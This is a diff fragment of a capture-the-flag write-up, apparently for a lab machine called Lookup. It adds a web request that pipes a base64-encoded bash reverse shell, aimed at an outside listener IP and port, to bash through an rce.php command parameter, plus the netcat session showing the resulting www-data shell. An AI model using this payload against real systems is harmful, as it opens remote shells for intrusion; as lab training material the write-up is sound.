@@ -209,6 +209,16 @@ Set a Netcat
 Listening on 0.0.0.0 9001
 ```
 Use it at web like that:
-
+```
 http://files.lookup.thm/rce.php?cmd=echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTM4LjkvOTAwMSAwPiYxCg==' | base64 -d | bash
+```
 
+And like that we are in:
+```
+[ Oguri ~/Desktop/CTF/Lookup ]$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.80.133.47 46692
+bash: cannot set terminal process group (809): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-80-133-47:/var/www/files.lookup.thm/public_html$ 
+```
